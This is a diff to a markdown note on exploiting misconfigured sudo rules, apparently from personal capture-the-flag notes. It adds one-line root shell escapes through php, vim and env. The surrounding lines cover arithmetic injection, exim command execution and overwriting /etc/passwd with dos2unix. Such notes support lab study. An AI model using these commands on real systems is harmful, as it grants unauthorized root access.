@@ -32,7 +32,10 @@ Exploiting misconfigured `sudo` permissions to escalate privileges.
 - `(maci) NOPASSWD: /home/maci/script.sh` → script uses `[[ $num -eq 123123 ]]` → arithmetic injection `a[$(/bin/bash -p >&2)]` → shell as `maci` ([[bruteshock]], [[arithmetic-injection]]).
 - `(pepe) NOPASSWD: /usr/sbin/exim` → `exim -be '${run{…}}'` runs commands as pepe ([[bruteshock]], [[exim-lpe]]).
 - `(ALL) NOPASSWD: /usr/bin/dos2unix` → `dos2unix -f -n /tmp/passwd.new /etc/passwd` blanks root's password → `su -` ([[bruteshock]], [[writable-etc-passwd]]).
+- `(ALL) NOPASSWD: /usr/bin/php` → `sudo -u root php -r 'system("/bin/sh -i")'` → root ([[littlepivoting]]).
+- `(ALL) /usr/bin/vim` → `sudo -u root vim` then `:!/bin/bash` → root ([[littlepivoting]]).
+- `(root) NOPASSWD: /usr/bin/env` → `sudo -u root env /bin/bash` → root ([[littlepivoting]]).
 
 ## Seen in
 
-[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]]
+[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]]
